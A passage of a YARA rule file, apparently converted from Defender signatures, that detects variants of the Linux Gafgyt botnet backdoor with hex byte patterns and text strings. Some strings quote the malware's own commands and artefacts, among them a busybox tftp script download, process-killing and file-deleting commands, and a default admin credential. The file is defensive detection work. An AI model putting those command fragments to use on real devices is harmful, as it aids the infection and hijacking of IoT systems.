        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {e6 2f 22 4f 07 d0 f0 7f f3 6e 42 2e 51 1e 09 e4 62 1e 73 1e ?? ?? e3 65 10 7e e3 6f 26 4f f6 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {4e 56 ff f0 20 2e 00 08 2d 40 ff f0 20 2e 00 0c 2d 40 ff f4 2d 6e 00 10 ff f8 20 2e 00 14 2d 40 ff fc 41 ee ff f0 2f 08 48 78 00 09 61 ff 00 00 0e ?? 50 8f 4e 5e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Gafgyt_CA_2147819488_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CA!xp"
        threat_id = "2147819488"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "$UICIDEBOY$" ascii //weight: 1
        $x_1_2 = "killed pid" ascii //weight: 1
        $x_1_3 = "hlLjztqZ" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_5 = "mHoIJPqGRSTUVWXL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_L_2147819494_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.L!MTB"
        threat_id = "2147819494"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "killdevices" ascii //weight: 1
        $x_1_2 = "stdplain" ascii //weight: 1
        $x_1_3 = "Modified Bot" ascii //weight: 1
        $x_1_4 = "Bypass" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_M_2147819495_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.M!MTB"
        threat_id = "2147819495"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "TCPSLAM" ascii //weight: 1
        $x_1_2 = "LOLNOGTFO" ascii //weight: 1
        $x_1_3 = "Is$uper@dmin" ascii //weight: 1
        $x_1_4 = "xmhdipc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_N_2147819496_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.N!MTB"
        threat_id = "2147819496"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "B0TK1LL" ascii //weight: 1
        $x_1_2 = "TCP-RAW" ascii //weight: 1
        $x_1_3 = "hlLjztqJ" ascii //weight: 1
        $x_1_4 = "RAW-ACK" ascii //weight: 1
        $x_1_5 = "UDP-CHECK-IPPROTO_UDP" ascii //weight: 1
        $x_1_6 = "UDP-REG" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Backdoor_Linux_Gafgyt_BQ_2147819506_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BQ!xp"
        threat_id = "2147819506"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {7d 0c 00 01 80 fc 00 01 83 d0 00 01 85 34 00 01 86 b0 00 01 88 14 00 01 89 90 00 01 8c 9c 9d e3 bf}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BR_2147819507_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BR!xp"
        threat_id = "2147819507"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {02 3c b9 79 42 34 26 20 62 00 18 80 82 8f 80 18}  //weight: 1, accuracy: High
        $x_1_2 = {58 30 42 8c 18 80 83 8f 80 20 02 00 e8 38 62 24 21 10 82 00 00 00 44 8c 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BU_2147819508_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BU!xp"
        threat_id = "2147819508"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {48 89 e5 48 81 ec 40 01 00 00 89 bd dc fe ff ff 48 8b 05 50 4d 11 00 48 85 c0 74 20 8b 85 dc fe ff ff 48 98 48 c1 e0 02 48 89 c2 48 8b 05 35 4d 11 00 48 8d 04 02 8b 00 85 c0}  //weight: 1, accuracy: High
        $x_1_2 = {8b 4d fc 8b 45 fc 83 e8 03 48 98 8b 14 85 20 1d 51 00 8b 45 fc 83 e8 02 48 98 8b 04 85 20 1d 51 00 31 c2 8b 45 fc 31 d0 89 c2 81 f2 b9 79 37 9e 48 63 c1 89 14 85 20 1d 51 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BL_2147819541_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BL!xp"
        threat_id = "2147819541"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {02 24 00 00 62 a0 18 00 c2 8f 00}  //weight: 1, accuracy: High
        $x_1_2 = {e0 99 03 50 f8 bd 27 ac 07 bf af a8 07 be af a4 07 b1 af}  //weight: 1, accuracy: High
        $x_1_3 = {dc 8f 21 18 40 00 3c 82}  //weight: 1, accuracy: High
        $x_1_4 = {80 18 02 00 21 10 43 00 21 18 40 00 18 86 82 8f 00 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_O_2147819659_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.O!MTB"
        threat_id = "2147819659"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {05 00 1c 3c ?? ?? 9c 27 21 e0 99 03 e0 ff bd 27 1c 00 bf af 18 00 b0 af 10 00 bc af 52 10 02 24 0c 00 00 00 ?? ?? 99 8f 06 00 e0 10 21 80 40 00 09 f8 20 03 00 00 00 00 10 00 bc 8f 00 00 50 ac ff ff 02 24 1c 00 bf 8f 18 00 b0 8f 08 00 e0 03 20 00 bd 27}  //weight: 2, accuracy: Low
        $x_2_2 = {3c 1c 00 05 27 9c ?? ?? 03 99 e0 21 27 bd ff e0 af bf 00 1c af b0 00 18 af bc 00 10 24 02 10 52 00 00 00 0c 8f 99 ?? ?? 10 e0 00 06 00 40 80 21 03 20 f8 09 00 00 00 00 8f bc 00 10 ac 50 00 00 24 02 ff ff 8f bf 00 1c 8f b0 00 18 03 e0 00 08 27 bd 00 20}  //weight: 2, accuracy: Low
        $x_1_3 = "UDPRAW" ascii //weight: 1
        $x_1_4 = "bot.mips" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_CB_2147819774_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CB!xp"
        threat_id = "2147819774"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {03 1a 03 3c 36 7c 53 35 31 1a 01 12 2e 0a 02 21 1e e2 67 e1 58 72 2e 81 1e e1 58 8c 36}  //weight: 1, accuracy: High
        $x_1_2 = {c8 71 1e 51 12 22 e3 61 c8 71 1e 52 23 d1 1c 32 21 d1 21 11 e3 61 c8 71 1e 52 21 d1 1c 32}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BZ_2147819866_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BZ!xp"
        threat_id = "2147819866"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {bf e0 c2 07 bf e0 87 30 60 00 84 10 20 00 84 10 00 03 03 00 00 c5}  //weight: 1, accuracy: High
        $x_1_2 = {00 80 01 c2 08 40 00 83 28 60 18 83 38 60 18 90 10 00 01 40 00 2b d4 01 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_Q_2147819950_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.Q!MTB"
        threat_id = "2147819950"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {10 40 2d e9 21 01 ?? ef 01 0a 70 e3 00 40 a0 e1 03 00 ?? ?? ?? ?? ff eb 00 30 64 e2 00 30 80 e5 00 40 e0 e3 04 00 a0 e1 10 80 bd e8}  //weight: 2, accuracy: Low
        $x_1_2 = "KILLATTK" ascii //weight: 1
        $x_1_3 = "bigbots" ascii //weight: 1
        $x_1_4 = "UDPRAW" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_CA_2147820136_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CA!MTB"
        threat_id = "2147820136"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {e1 a0 c0 0d e9 2d 00 0e e9 2d d8 00 e2 4c b0 10 e2 4d d0 14 e5 0b 00 20 e3 a0 0b 02 eb [0-5] e1 a0 30 00 e5 0b 30 18 e5 1b 30 18 e1 a0 00 03 e3 a0 10 00 e3 a0 2b 02 eb [0-5] e5 1b 30 18 e5 0b 30 14 e2 8b 30 08 e5 0b 30 1c e5 9b 20 04 e5 1b c0 1c e2 4b 30 18}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CC_2147820175_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CC!xp"
        threat_id = "2147820175"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {40 19 00 00 a6 90 12 20 34 96 12 e0 94 98 13 20 d8 9a 10 00 01 40 00 54 87 01}  //weight: 1, accuracy: High
        $x_1_2 = {24 00 01 a5 90 00 01 a7 34 00 01 a9 88 00 01 aa 5c 00 01 ae 94 00 01 b1 54 00 01 b5 44 00 01 b6 b0 00 01 b7 60 00 01}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CE_2147820177_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CE!xp"
        threat_id = "2147820177"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {31 ed 49 89 d1 5e 48 89 e2 48 83 e4 f0 50 54 48 c7 c7 30 85 40 00 48 c7 c1 e8 00 40 00 49 c7 c0 88 7a 41 00}  //weight: 1, accuracy: High
        $x_1_2 = {48 8b 45 98 8b 50 0c 48 8b 45 a8 89 50 0c 48 8b 45 a0 8b 10 48 8b 45 a8 66 89 50 10 48 8b 7d a8}  //weight: 1, accuracy: High
        $x_1_3 = {48 89 c6 48 8b 84 c5 10 fe ff ff 48 89 c2 48 8b 85 60 ff ff ff 8b 00 89 c1 83 e1 3f b8 01 00 00 00 48 d3 e0 48 09 d0 48 89 84 f5 10 fe ff ff 48 8b 85 60 ff ff ff 8b 00 3b 85 78 ff ff ff}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Gafgyt_R_2147820293_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.R!MTB"
        threat_id = "2147820293"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "BOTKILL" ascii //weight: 5
        $x_1_2 = "hlLjztqZ" ascii //weight: 1
        $x_1_3 = "/proc/%d/exe" ascii //weight: 1
        $x_1_4 = "Ch1ngCh0ng" ascii //weight: 1
        $x_1_5 = "killed process" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_CD_2147820428_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CD!xp"
        threat_id = "2147820428"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {20 9f e5 04 30 82 e5 14 30 1b e5 3d 34 83 e2 91 38 43 e2 32 3d 43 e2 0e 30 43 e2 74 20 9f e5 08 30 82 e5 03}  //weight: 1, accuracy: High
        $x_1_2 = {30 83 e2 18 30 0b e5 00 30 a0 e3 28 30 0b e5 28 20 1b e5 2c 20 0b e5 18 30 1b e5 00 30 d3 e5 00 00 53 e3}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CF_2147820429_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CF!xp"
        threat_id = "2147820429"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox kill -9 %d" ascii //weight: 1
        $x_1_2 = "/bin/busybox cat /proc/mounts" ascii //weight: 1
        $x_1_3 = "rm -rf cmsguard upnp" ascii //weight: 1
        $x_1_4 = "/bin/busybox echo -e '%s%s' > %s/.nippon" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_CG_2147820430_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CG!xp"
        threat_id = "2147820430"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {41 57 41 56 41 55 41 89 fd 41 54 44 0f b6 e2 ba 15 00 00 00 44 89 e7 55 53 48 89 cb 31 c9 48 81 ec c8 51 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CL_2147820484_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CL!MTB"
        threat_id = "2147820484"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {40 be 00 24 3c 60 10 01 7f c4 f3 78 38 63 ab bc 4c c6 31 82 4b ff e8 ?? 7f 83 f8 00 41 be 00 08 48 00 0c 55 80 01 00 14}  //weight: 1, accuracy: Low
        $x_1_2 = {81 23 00 00 7c 0a 48 ae 7c c0 02 78 7c 0a 49 ae 81 63 00 00 7c 0a 58 ae 7c e0 02 78 7c 0a 59 ae 81 23 00 00 7c 0a 48 ae 7d 00 02 78 7c 0a 49 ae 81 63 00 00 7c 0a 58 ae 7c a0 02 78 7c 0a 59 ae 39 4a 00 01 a0 03 00 04 7f 80 50 00 41 9d ff b4}  //weight: 1, accuracy: High
        $x_1_3 = {48 00 00 44 7d 3f e0 51 41 82 00 7c 7c 1f e8 ae 7f 1e c3 78 7c 9f ea 14 98 18 00 04 34 09 ff ff 41 82 00 64 8b e4 00 01 7c 09 03 78 3b 89 ff ff 38 84 00 01 7f 9c f8 00 3b 18 00 08 41 9c 00 48 3b a4 00 01 38 80 00 01}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Gafgyt_CM_2147820485_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CM!MTB"
        threat_id = "2147820485"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {10 2d 80 42 00 00 a0 82 00 00 8f c2 00 08 24 42 00 01 af c2 00 08 8f c2 00 08 8f c3 00 00 00 62 10 2a 10 40 ff ed 00 00 00 00 8f c3 00 08}  //weight: 1, accuracy: High
        $x_1_2 = {10 2d 00 e0 18 2d 00 02 10 00 af c2 00 10 00 03 10 00 af c2 00 14 ff c0 00 30 24 02 00 20 ff c2 00 28 8f c2 00 10 18 40 00 23 00 00 00 00 ff c0 00 20 df c3 00 08 ff c3 00 18 10 00 00 08 00 00 00 00 df c3 00 20 24 62 00 01 00 40 18 2d ff c3 00 20 df c2 00 18 64 42 00 01 ff c2 00 18}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_S_2147820494_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.S!MTB"
        threat_id = "2147820494"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {31 16 51 55 d2 08 41 2c 31 12 60 fc 7f ?? 62 9c 91 9c 93 ec 33 1c 33 9a 97 50 d6 95 91 ec 31 18 51 12 22 33 64 73 65 03 67 4d d1 0b 41}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_U_2147820495_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.U!MTB"
        threat_id = "2147820495"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {f0 82 00 60 01 c2 27 bf f0 10 bf ff bc 01 00 00 00 9d e3 ?? 40 f0 27 a0 44 f2 27 a0 48 f4}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CE_2147821038_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CE!MTB"
        threat_id = "2147821038"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {10 00 dc 8f 21 20 40 00 97 53 02 3c 9d 82 42 34 19 00 82 00 10 10 00 00 02 11 02 00 68 01 c2 af 68 01 c2 8f}  //weight: 1, accuracy: High
        $x_1_2 = {18 00 dc 8f 21 20 40 00 55 55 02 3c 56 55 42 34 18 00 82 00 10 18 00 00 c3 17 04 00 23 18 62 00 44 02 c3 af 44 02 c2 8f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CQ_2147821039_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CQ!MTB"
        threat_id = "2147821039"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3c 1c 00 06 27 9c 33 48 03 99 e0 21 27 bd ef b0 af bf 10 4c af be 10 48 03 a0 f0 21 af bc 00 10 27 c2 00 2c af c2 00 28 8f 99 84 a8 [0-5] 03 20 f8 09 [0-5] 8f dc 00 10 af c2 00 18 8f c4 00 1c}  //weight: 1, accuracy: Low
        $x_1_2 = {27 c2 00 44 00 40 20 21 8f c5 00 3c 8f c6 00 38 8f c7 00 28 8f 82 80 20 [0-5] 24 59 0e ac 03 20 f8 09 [0-5] 8f dc 00 10 14 40 00 28 [0-5] 27 c2 00 44 00 40 20 21 8f c5 00 3c 8f c6 00 34 8f c7 00 24 8f 82 80 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CH_2147822219_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CH!xp"
        threat_id = "2147822219"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 4d fc 8b 45 fc 83 e8 03 48 98 8b 14 85 40 d6 50 00 8b 45 fc 83 e8 02 48 98 8b 04 85 40 d6 50 00 31 c2 8b 45 fc 31 d0 89 c2 81 f2 b9 79 37 9e 48 63 c1 89 14 85 40 d6 50 00 ff 45 fc}  //weight: 1, accuracy: High
        $x_1_2 = {48 89 e5 48 83 ec 20 89 7d ec 8b 3d 3f 36 11 00 e8 ?? ?? ?? ?? 23 45 ec 89 45 fc e8 ?? ?? ?? ?? 89 c2 8b 45 ec f7 d0 21 d0 33 45 fc}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CI_2147822361_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CI!xp"
        threat_id = "2147822361"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "kill -9 $(pidof busybox" ascii //weight: 1
        $x_1_2 = "/usr/sbin/dropbear" ascii //weight: 1
        $x_1_3 = "busybox tftp -r tftp2.sh -g" ascii //weight: 1
        $x_1_4 = {c7 85 9c fd ff ff 89 02 12 80 8b 85 9c fd ff ff f7 e9 8d 04 0a 89 c2 c1 fa 0f 89 c8 c1 f8 1f}  //weight: 1, accuracy: High
        $x_1_5 = {29 c3 89 d8 89 45 c0 8b 45 c0 69 c0 dc ff 00 00 89 ca 29 c2 89 d0}  //weight: 1, accuracy: High
        $x_1_6 = {89 45 c0 c7 45 bc 01 00 00 00 48 8d bd 60 ff ff ff be e0 33 41 00 ba 54 00 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_CK_2147822366_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CK!xp"
        threat_id = "2147822366"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {30 4b e5 43 34 a0 e1 2f 30 4b e5 68 32 1b e5 03 38 a0 e1 23 38 a0 e1 2e 30 4b e5 43 34 a0 e1 2d 30 4b e5 00 30 a0 e3 14 30 0b e5 cc 30 9f e5 26}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CL_2147822376_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CL!xp"
        threat_id = "2147822376"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {bd 27 2c 00 bf af 28 00 be af 21 f0 a0 03 10 00 bc af 30 00 c4 af 1c 00 c0 af 30 00 c4 8f 68 81 99 8f 00 00 00 00 09 f8 20 03 00}  //weight: 1, accuracy: High
        $x_1_2 = {21 28 40 00 20 80 82 8f 00 00 00 00 e0 07 59 24 09 f8 20 03}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Gafgyt_CJ_2147822461_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CJ!xp"
        threat_id = "2147822461"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 4d fc 8b 45 fc 83 e8 03 48 98 8b 14 85 60 19 51 00 8b 45 fc 83 e8 02 48 98 8b 04 85 60 19 51 00 31 c2 8b 45 fc 31 d0 89 c2 81 f2 b9 79 37 9e 48 63 c1 89 14 85 60 19 51 00 ff 45 fc}  //weight: 1, accuracy: High
        $x_1_2 = {55 48 89 e5 89 7d ec 8b 45 ec 89 05 90 17 11 00 8b 45 ec 2d 47 86 c8 61 89 05 86 17 11 00 8b 45 ec 05 72 f3 6e 3c}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CS_2147822837_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CS!MTB"
        threat_id = "2147822837"
        type = "Backdoor"
        platform = "Linux: Linux platform"
